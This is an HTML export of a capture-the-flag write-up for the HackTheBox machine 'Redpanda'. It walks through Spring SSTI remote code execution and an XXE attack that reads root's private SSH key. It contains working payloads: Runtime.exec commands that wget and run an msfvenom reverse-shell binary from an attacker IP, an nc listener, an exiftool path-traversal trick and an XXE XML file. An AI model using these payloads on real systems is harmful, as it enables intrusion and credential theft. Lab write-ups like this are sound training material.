<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>redpanda</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>redpanda</h1><br/><p><strong><h1>HTB: Redpanda</h1></strong></p><p></p><p><strong><h2>Enumeration</h2></strong></p><p></p><p><strong>Rustscan &amp; Nmap</strong></p><p></p><p><img src="images/62-1.png" alt="images/62-1.png" /></p><p></p><p><strong>Website Enumeration</strong></p><p></p><p><img src="images/62-2.png" alt="images/62-2.png" /></p><p></p><p>Its a seach field. I tested it with “abc”.</p><p></p><p><img src="images/62-3.png" alt="images/62-3.png" /></p><p></p><p>Next, we test with blank value &amp; we get some intresting results.</p><p></p><p><img src="images/62-4.png" alt="images/62-4.png" /></p><p></p><p>Next, I explored by clicking on the <strong>Author: woodenk</strong> hyperlink.</p><p></p><p><img src="images/62-5.png" alt="images/62-5.png" /></p><p></p><p>We go to a <strong>stats</strong> page. We find theer are 2 authors: <strong>woodenk</strong> &amp; <strong>damian</strong>.</p><p>Each of them around 4 Panda images.</p><p>I tried searching for each of them in the search tab. But there is no important info in any of them. Except the first searched “greg” where it specifies about <strong>“Injection”</strong>.</p><p></p><p><strong>Directory Enumeration</strong></p><p></p><p><img src="images/62-6.png" alt="images/62-6.png" /></p><p></p><p>Upon opening the /error directory we get an error message. I searched it in google &amp; got the underlying framework as <strong>SpringFramework</strong></p><p></p><p><img src="images/62-7.png" alt="images/62-7.png" /></p><p></p><p><strong><h2>Foothold</h2></strong></p><p></p><p>After exploring various injections we find that the application is vulnerable to <strong>SSTI</strong> (Server Side Template Injection).</p><p></p><p>We use the following payload (Without the double quotes) in the search to test it.</p><p></p><p>&quot;<strong>#{7*7}</strong>&quot;</p><p></p><p><img src="images/62-8.png" alt="images/62-8.png" /></p><p></p><p>The following payload also works with cleaner output.</p><p></p><p>&quot;<strong>*{7*7}</strong>&quot;</p><p></p><p><img src="images/62-9.png" alt="images/62-9.png" /></p><p></p><p>If I try &quot;<strong>*{7*&#39;7&#39;}</strong>&quot;, it wouldn’t work which showed that it is not a Python program.</p><p></p><p><strong>Banned Characters</strong></p><p></p><p>While doing some testing, I received a message that it contains banned characters. Further testing allows me to find out characters like underscore ‘<strong>_</strong>&#39; and percentage ‘<strong>%</strong>’, are banned.</p><p></p><p><img src="images/62-10.png" alt="images/62-10.png" /></p><p></p><p>From the following link. I got the <strong>RCE</strong> code &amp; tried it.</p><p><strong>https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/el-expression-language.md</strong></p><p></p><p><strong>{&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;curl http://10.10.16.7:80&quot;)}</strong></p><p></p><p>However, for the above payload, we will not see any output. So I have to setup a webserver on my kali machine to test it.</p><p>And finally we have to add * in the beginning of the payload for it to work as we saw above for <strong>*{7*7}</strong></p><p></p><p><strong>Final Payload</strong></p><p></p><p><strong>*{&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;curl http://10.10.16.7:80&quot;)}</strong></p><p></p><p>I searched the above &amp; verified it on my python web server.</p><p></p><p><img src="images/62-11.png" alt="images/62-11.png" /></p><p></p><p>We got successful RCE.</p><p></p><p><img src="images/62-12.png" alt="images/62-12.png" /></p><p></p><p><strong>Reverse Shell</strong></p><p></p><p>I will create a linux executible using msfvenom &amp; then upload it to the target machine &amp; execute it.</p><p></p><p><strong>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.7 LPORT=7777 -f elf -o shell.elf</strong></p><p></p><p>Next, I will host it in my local kali machine using python webserver.</p><p></p><p><strong>python -m http.server 80</strong></p><p></p><p>Next, I start the listener on my kali machine.</p><p></p><p><strong>rlwrap nc -lvnp 7777</strong></p><p></p><p></p><p>On Target side, I run the following 3 payloads in search sequentially.</p><p></p><p><strong>*{&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;wget 10.10.16.7/shell.elf&quot;)}</strong></p><p><strong></strong></p><p><strong>*{&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;chmod 777 ./shell.elf&quot;)}</strong></p><p><strong></strong></p><p><strong>*{&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;./shell.elf&quot;)}</strong></p><p></p><p>We got access to the machine.</p><p></p><p><img src="images/62-13.png" alt="images/62-13.png" /></p><p></p><p>Intresting point to notice is that <strong>woodenk</strong> are also a member of <strong>logs</strong> group.</p><p>I stabilize the shell by using python.</p><p></p><p>We get the user flag in the woodenk&#39;s home directory.</p><p></p><p></p><p><strong><h2>Privilege Escalation</h2></strong></p><p></p><p>We check for running processes using <strong>pspy64</strong></p><p></p><p>I hosted in my local kali machine &amp; downloaded in the target machine.</p><p></p><p><img src="images/62-14.png" alt="images/62-14.png" /></p><p></p><p>We run it &amp; check the following snap.</p><p></p><p><img src="images/62-15.png" alt="images/62-15.png" /></p><p></p><p>There is a jar file running as root user. I will download this file to my local machine &amp; examine it.</p><p>Then i opened the <strong>final-1.0-jar-with-dependencies.jar</strong> file with <strong>jd-gui</strong> in my kali machine.</p><p></p><p>Go to <strong>com ---- logparser ---- App.class</strong> to get the code as shown below.</p><p></p><p><img src="images/62-16.png" alt="images/62-16.png" /></p><p></p><p></p><p>Based on the code, we can see that content of /opt/panda_search/redpanda.log will be read line by line. After understanding the code, I realized there are a few conditions to pass:</p><p></p><p>    ▪ 	The line must contain “.jpg” in the string</p><p>    </p><p>    ▪ 	split() will be done to the string where “||” is the delimiter. See above code for .split(“\\|\\|”).</p><p>       	The string must be split into 4 strings:</p><p>            The first string must be a number.</p><p>            4th string must be pointing to an existing .jpg file.</p><p>            </p><p>    ▪ 	The .jpg file’s metadata tag “Artist” must have a value that matched to /credits/&lt;author_name&gt;_creds.xml.</p><p>     	Since the current user does not have WRITE access to /credits, I have to set the “Artist” value to “<strong>../tmp/cybex</strong>” where our XML exploit will be at <strong>/tmp/cybex_credits.xml</strong>.</p><p>     </p><p>    ▪ 	JPG file should be in a folder where the current user has WRITE access. I used /tmp.</p><p>    </p><p></p><p><strong>Creating Image FIle:</strong></p><p></p><p>Next, we create a <strong>JPG file</strong> &amp; add the <strong>author</strong> name to its <strong>metadata</strong>.</p><p></p><p>I used gimp to create the file &amp; named it <strong>KungFuPanda.jpg</strong></p><p></p><p>Next, we need this file inside the <strong>/credits</strong> directory</p><p></p><p><img src="images/62-17.png" alt="images/62-17.png" /></p><p></p><p>Since we are not the folder’s owner, we cannot change its permission. Due to the source code does not sanitize our Artist’s name, we can use a name that directory traversals to where we store our exploit XML file in a folder where our user has WRITE access.</p><p></p><p>We use the following to modify the metadata of our image.</p><p></p><p><strong><span style="color:#00ffff;">exiftool -Artist=&quot;../tmp/cybex&quot;  KungFuPanda.jpg</span></strong></p><p></p><p><img src="images/62-18.png" alt="images/62-18.png" /></p><p></p><p></p><p><strong>Creating XML File:</strong></p><p></p><p>A quick and easy way to see the structure of the required XML is to look at an existing XML file on the victim’s machine.</p><p></p><p><img src="images/62-19.png" alt="images/62-19.png" /></p><p></p><p></p><p>We will modify it &amp; make our xml file as follows. We will only keep the necessary parts.</p><p></p><p><img src="images/62-20.png" alt="images/62-20.png" /></p><p></p><p></p><p>Using the link</p><p></p><p><strong>https://knowledge-base.secureflag.com/vulnerabilities/xml_injection/xml_entity_expansion_java.html#vulnerable-example-1</strong></p><p></p><p>Our XML:</p><p></p><p><strong>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</strong></p><p><strong>&lt;!DOCTYPE foo [</strong></p><p><strong>   &lt;!ELEMENT foo ANY &gt;</strong></p><p><strong>   &lt;!ENTITY xxe SYSTEM &quot;file:///root/.ssh/id_rsa&quot; &gt;]&gt;</strong></p><p><strong>&lt;credits&gt;</strong></p><p><strong>  &lt;author&gt;cybex&lt;/author&gt;</strong></p><p><strong>  &lt;image&gt;</strong></p><p><strong>    &lt;uri&gt;/../../../../../../tmp/KungFuPanda.jpg&lt;/uri&gt;</strong></p><p><strong>    &lt;views&gt;1&lt;/views&gt;</strong></p><p><strong>    &lt;foo&gt;&amp;xxe;&lt;/foo&gt;</strong></p><p><strong>  &lt;/image&gt;</strong></p><p><strong>  &lt;totalviews&gt;2&lt;/totalviews&gt;</strong></p><p><strong>&lt;/credits&gt;</strong></p><p></p><p><strong>Notes:</strong></p><p></p><p>We have changed artist to our artist name: (cybex)</p><p>We have changed the URI Path: (/../../../../../../tmp/KungFuPanda.jpg)</p><p>Name of XML File: (cybex_creds.xml)</p><p></p><p></p><p><strong>URI Path Explanation</strong></p><p><img src="images/62-21.png" alt="images/62-21.png" /></p><p></p><p>The above code snippet contains the path of the URI. So from there we use directory trasversal to point the URI to our jpg in /tmp folder.</p><p></p><p><strong>Content for LOG File:</strong></p><p></p><p></p><p><img src="images/62-22.png" alt="images/62-22.png" /></p><p></p><p>We know that there are a few conditions for the content in the log file:</p><p></p><p>    ▪ split() will be done to the string where “||” is the delimiter. See this article for .split(“\\|\\|”).</p><p>        ▪ The string must be split into 4 strings:</p><p>            ▪ The first string must be a number.</p><p>            ▪ 4th string must be pointing to an existing .jpg file.</p><p></p><p>So our final content for log file will be:</p><p></p><p><strong>222||a||a||/../../../../../../tmp/KungFuPanda.jpg</strong></p><p></p><p><strong>Exploitation:</strong></p><p></p><p>We keep the JPG &amp; XML files in the target machine&#39;s /tmp directory &amp; make the above change to log file.</p><p></p><p><img src="images/62-23.png" alt="images/62-23.png" /></p><p></p><p>After some time, our XML file will have id_rsa of root. </p><p></p><p><img src="images/62-24.png" alt="images/62-24.png" /></p><p></p><p>As we can see above, we have the id_rsa of the root user. We copy it to a file named id_rsa.</p><p>Change its permission to 600 &amp; ssh to the target machine as root using this file.</p><p></p><p><img src="images/62-25.png" alt="images/62-25.png" /></p><p></p><p>We get the root flag in the /root directory.</p><p></p><p></p><p>Thanks !!</p></div>
</body>
</html>
